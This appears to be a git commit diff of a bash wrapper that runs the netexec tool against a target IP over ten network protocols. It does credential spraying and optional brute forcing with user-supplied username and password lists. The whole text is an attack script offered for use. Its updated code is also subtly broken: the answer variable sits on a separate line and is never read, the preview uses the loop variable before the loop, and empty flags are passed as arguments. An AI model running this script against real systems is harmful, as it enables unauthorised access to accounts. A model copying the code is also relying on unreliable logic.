683ec210b9ec7670f662dd5f5e469555e2221c93
c1dn3y <36340312+c1dn3y@users.noreply.github.com>
2025-01-17 14:01:10 -0600

    Update netexec_all_protos.sh

--- netexec_all_protos.sh
+++ netexec_all_protos.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 # netexec all protocols
 protos=("wmi" "rdp" "winrm" "ldap" "ssh" "mssql" "nfs" "smb" "ftp" "vnc")
+
 echo -n "Enter the username or name of file containing usernames: "
 read user
 echo -n "Enter the password or name of file containing passwords: "
@@ -9,21 +10,36 @@ echo -n "Enter the domain: "
 read domain
 echo -n "Enter the target IP: "
 read ip
-echo -n "Brute force (y/n): "
-read brute
-if brute = y
-  brutey == ""
-  else 
-    brutey == "--no-brute"
-echo -n "Continue on success (y/n): "
-read brute
-if brute = y
-  cos == "--continue-on-success"
-  else 
-    cos == ""
 
 
-for i in ${protos[@]}; 
-  do
-  netexec $i $ip -u $user -p $password -d $domain $brutey --continue-on-success
+read -p "Brute force (y/n): " brute
+if [[ "$brute" == "n" ]]; then
+  brutey="--no-brute"
+else
+  brutey=""
+fi
+
+read -p "Continue on success (y/n): " cos_input 
+if [[ "$cos_input" == "y" ]]; then
+  cos="--continue-on-success"
+else
+  cos=""
+fi
+
+preview_command="netexec $i $ip -u \"$user\" -p \"$password\" -d \"$domain\" $brutey $cos"
+
+echo -n "Your command: $preview_command"
+read -p "Is this what you want to run (y/n)? " 
+ans
+
+if [[ "$ans" == "n" ]]; then 
+  echo "Exiting."
+  exit 0 
+fi
+
+for i in "${protos[@]}"; do 
+  echo "Running: netexec $i $ip -u \"$user\" -p \"$password\" -d \"$domain\" $brutey $cos"
+  netexec "$i" "$ip" -u "$user" -p "$password" -d "$domain" "$brutey" "$cos" 
 done
+
+echo "Script finished."
